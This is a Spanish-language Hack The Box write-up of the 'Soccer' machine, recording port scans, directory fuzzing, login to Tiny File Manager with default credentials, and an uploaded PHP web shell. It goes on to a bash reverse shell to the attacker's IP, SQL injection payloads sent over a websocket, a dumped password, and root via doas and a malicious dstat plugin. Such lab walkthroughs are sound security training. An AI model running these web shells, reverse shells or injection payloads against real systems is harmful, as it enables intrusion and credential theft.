---
title: Soccer
date: 2023-05-17 00:00:00 +/-TTTT
categories: [WRITEUP, Hack The Box]
tags: [writeup]     # TAG names should always be lowercase
---

# Soccer Writeup

listado de cosas

* escaneo de puertos nmap
* conocer servicios y versiones
* puertos 22, 80, 9091 abiertos
* puerto 80 con servicio http
* redireccionamiento a soccer.htb
* whatweb y wappalizer (nginx descubierto)
* directory fuzzing
* login con tiny file manager
* que es tiny file manager
* tiny file manager default credentials
* upload web shell
* foothold http://web.htb/file.php?cmd= bash to me
* enumeracion del sistema
* interesante archivo suid, posible escalada de privilegios desde phil
* lectura archivos de configuracion de nginx
* subdomain soc-player.soccer.htb found
* virtualhosting, modify /etc/hosts
* lectura del codigo fuente de la pagina check, se conecta a un websocket en el puerto 9091
* vulnerable a injeccion sql
* script para convertir petisiones http para enviarlas al ws
* enumeracion database soccer_db
* username phil y password PlayerOftheMatch2022, usados en el ssh o con el comando su como www-data
* privilege escalation
* enumeracion de archivos suid
* doas es un archio suid, leo archivo de configuracion /usr/local/etc/doas.conf
* veo que como player, con doas, se puede ejecutar dstat como root
* en gtfobins hay un post para escalar privilegios con dstat al ser ejecutado como root
* pum, pwned!


---

## Enumeracion

```bash
nmap -p- --open --min-rate 1000 -v -Pn -n -oG allPots 10.10.11.194
```

```
Nmap scan report for 10.10.11.194
Host is up (0.16s latency).
Not shown: 53069 closed tcp ports (conn-refused), 12463 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 64.91 seconds
```

```
# Nmap 7.93 scan initiated Wed May 17 13:12:38 2023 as: nmap -p- --open --min-rate 1000 -v -Pn -n -oG allPots 10.10.11.194
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.194 ()	Status: Up
Host: 10.10.11.194 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 9091/open/tcp//xmltec-xmlmail///
# Nmap done at Wed May 17 13:13:43 2023 -- 1 IP address (1 host up) scanned in 64.91 seconds

```

```bash
nmap -p 22,80,9091 -sCV -v -oN infoPorts 10.10.11.194
```

nota: aca ya habia anotado la ip y el dominio en el hosts

```
# Nmap 7.93 scan initiated Wed May 17 13:17:30 2023 as: nmap -p 22,8
0,9091 -sCV -v -oN infoPorts 10.10.11.194
Nmap scan report for soccer.htb (10.10.11.194)
Host is up (0.23s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubun
tu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Soccer - Index 
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSe
ssionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close

<-- SNIP -->

```


```bash
echo '10.10.11.194 soccer.htb' >> /etc/hosts
```

```bash
wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://soccer.htb/FUZZ 2>/dev/null


********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://soccer.htb/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload     
=====================================================================

000008020:   301        7 L      12 W       178 Ch      "tiny"      
000045226:   200        147 L    526 W      6917 Ch     "http://socc
                                                        er.htb/"    

Total time: 0
Processed Requests: 220546
Filtered Requests: 220544
Requests/sec.: 0
```

leyendo el codigo fuente del login en la carpeta /tiny/ se encuentra la version del servicio (?
```html
<a href="https://tinyfilemanager.github.io/" target="_blank" class="text-muted" data-version="2.4.3">CCP Programmers</a> &mdash;&mdash;
```

tiny file manager default credentials

Default username/password: admin/admin@123 and user/12345.

ambas se pueden usar para loguearse
se pueden subir archivos en http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads&upload

el siguinte archivo es una web shell
```php
<?php
  echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
?>
```

prefiero subirlo por url, haciendo un servidor http con python3


```bash
python3 -m http.server
```

en la url para subir
http://10.10.14.133:8000/rv.php

el archivo se encuentra en la ruta /tiny/uploads/
lo encontre gracias a que la pagina de subida te musetra la carpeta destino 
Destination Folder: /var/www/html/tiny/uploads  

```bash
curl http://soccer.htb/tiny/uploads/rv.php\?cmd=id
curl "http://soccer.htb/tiny/uploads/rv.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.133/1337 0>&1'"
```

hay que urlencodear la url para que tome bien el comando y ponerse en escucha con nc

por un lado
```bash
nc -lnvp 1337
```

por otro lado
```bash
curl 'http://soccer.htb/tiny/uploads/rv.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.133/1337+0>%261"'
```


si presionas Ctrl+c se para la shel asi que hay que sanitizarla.

```bash
tty
```

vemos que no estamos en una tty

```bash
scirpt /dev/null -c bash
tty
```

ahora is estamos en una tty

a continuacion se presiona [Ctrl+z]
```bash
[Ctrl+z]
stty raw -echo;fg
reset xterm

export TERM=xterm-256color
stty rows 42 columns 167
```

con stty configuras cantidad de filas y columnas para que la terminal quede bien cuadrada
(haz stty size en una terminal normal del mismo tamaño en tu linux para conocer la cantidad de filas y columnas)

si se quiere colorcitos en la shel
```bash
export HOME=/etc/skel
bash
```

sabiendo que se esta utilizando nginx se puede buscar la configuracion del mismo para ver si hay usuarios u subdominios


```bash
cat /etc/nginx/sites-available/soc-player.htb
```

```
server {
	listen 80;
	listen [::]:80;

	server_name soc-player.soccer.htb;

	root /root/app/views;

	location / {
		proxy_pass http://localhost:3000;
		proxy_http_version 1.1;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_set_header Host $host;
		proxy_cache_bypass $http_upgrade;
	}

}
```

se encontro un subdominio
	server_name **soc-player.soccer.htb**;

se anota en el /etc/hosts para que apunte a la ip de la maquina

buscar en firefox
http://soc-player.soccer.htb/

enumerando un poco, se encuentra un login, una pagina de registro y una pagina para checkear un codigo que te dan.

http://soc-player.soccer.htb/check

```html
    <script>
        var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {
        
        var btn = document.getElementById('btn');
        var input = document.getElementById('id');
        
        ws.onopen = function (e) {
            console.log('connected to the server')
        }
        input.addEventListener('keypress', (e) => {
            keyOne(e)
        });
        
        function keyOne(e) {
            e.stopPropagation();
            if (e.keyCode === 13) {
                e.preventDefault();
                sendText();
            }
        }
        
        function sendText() {
            var msg = input.value;
            if (msg.length > 0) {
                ws.send(JSON.stringify({
                    "id": msg
                }))
            }
            else append("????????")
        }
        }
        
        ws.onmessage = function (e) {
        append(e.data)
        }
        
        function append(msg) {
        let p = document.querySelector("p");
        // let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
        // p.style.color = randomColor;
        p.textContent = msg
        }
    </script>
```


la variable ws es un web socket que se conecta a la maquina en el puerto 9091.

la cual es vulnerable a sql injection, probando en la consola de la web se puede testear el siguiente codigo
```javascript
ws.onmessage = function (e) {console.log(e.data)}
ws.send(JSON.stringify({"id":"2"}))
ws.send(JSON.stringify({"id":"95280"}))
ws.send(JSON.stringify({"id":"2 or '1' = '1' -- -"}))
ws.send(JSON.stringify({"id":"95280 and sleep(10) -- -"}))
```


* buscar script que recibe peticion http y la pasa a un wesocket para usar sqlmap
* hacer script que dumpe la base de datos

---

┄┄Parameter: id (GET)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=2 AND (SELECT 4020 FROM (SELECT(SLEEP(5)))ALtY)

dumped database (soccer_db)
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+

---

# Lateral movement
```bash
ssh player@10.10.11.194
Password: PlayerOftheMatch2022
```


## Privilege escalation
enumeracion de archivos suid
```bash
find / -perm -4000 2>/dev/null
```

el archivo /usr/local/bin/doas tiene privilegios suid asi que se puede ejecutar como root.

se puede leer el archivo de configuracion de doas.
```bash
cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

esto quiere decir que con doas se puede ejecutar dstat como root siendo el usuario player.
buscando en gtfobins se encuentra un comando para escalar privilegios al ejecutar dstat como root

```bash
echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
/usr/local/bin/doas -u root /usr/bin/dstat --xxx

```

ya como root se puede ejecutar bash para que este mas bonito y se vea usuario, host, pwd
```bash
# bash
root@soccer:~#
root@soccer:~# cat root.txt 
a6bb659aa52b6e96abc553e0bb5be07b
```

















